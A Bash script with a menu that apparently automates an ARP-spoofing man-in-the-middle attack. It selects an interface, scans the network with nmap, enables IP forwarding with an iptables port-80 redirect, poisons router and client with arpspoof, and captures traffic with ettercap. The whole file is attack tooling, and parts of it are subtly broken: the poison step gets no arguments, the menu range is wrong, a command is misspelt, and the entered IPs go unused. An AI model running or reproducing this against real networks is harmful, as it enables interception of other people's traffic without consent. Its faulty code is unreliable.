#!/bin/bash
source /root/Desktop/Bash_Scripts/sources/Variables.sh
# function to display menu
Show_Main_Menu() {
	clear
	echo -e "${BOLD}${BLUE}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	echo -e " ARP POISON + ETTERCAP"
	echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${STD}"
	echo "1. Choose Network Interface"
	echo "2. Input Network Address"
  echo "3. Scan For Targets"
  echo "4. Enable Ip Forwarding"
	echo "5. Poison"
  echo "6. Ettercap"
  echo "7. Exit"
}

Read_Options() {
	local choice
  echo -e "${BOLD}${ORANGE}Enter choice [1 - 5]${STD}"
  read choice
	case $choice in
		1) Interface ;;
		2) NA ;;
    3) Scan $NA;;
    4) IP_Forward ;;
    5) Poison ;;
    6) Ettercap ;;
		7) exit 0;;
		*) echo -e "${BOLD}${LIGHTRED}Error...${STD}" && sleep 1 && clear
	esac
}

Interface() {
	clear
  sudo nmcli device
	echo -e "${BOLD}${BLUE}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo -e " Input The Network Device To Use (usually eth0 or wlan0)."
	echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${STD}"
  read device
  Monitor $device
}

function Monitor() {
	airmon-ng check kill
	airmon-ng start $1
}

function NA() {
  clear
	echo -e "${BOLD}${BLUE}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo -e " Input The Network Address."
	echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${STD}"
  read NA
}

function Scan() {
  sudo nmap -sP $1
  arp -n -a
  apr -a
  echo -e "${BOLD}${BLUE}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo -e " Input The Router IP Address."
	echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${STD}"
  read routerip
  echo -e "${BOLD}${BLUE}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo -e " Input The Client IP Address."
	echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${STD}"
  read clientip
}

function IP_Forward() {
  #making sure it runs using sudo AND Bash -c
  sudo bash -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1024
}

function Poison() {
  sudo arpspoof -i $1 -t $2 -r $3
}

function Ettercap() {
  sudo gnome-terminal -e ettercap -Tq -i wlan0 -w /root/Desktop/cap
}

# -----------------------------------
# Main logic - infinite loop
# ------------------------------------
while true
do

	Show_Main_Menu
	Read_Options
done
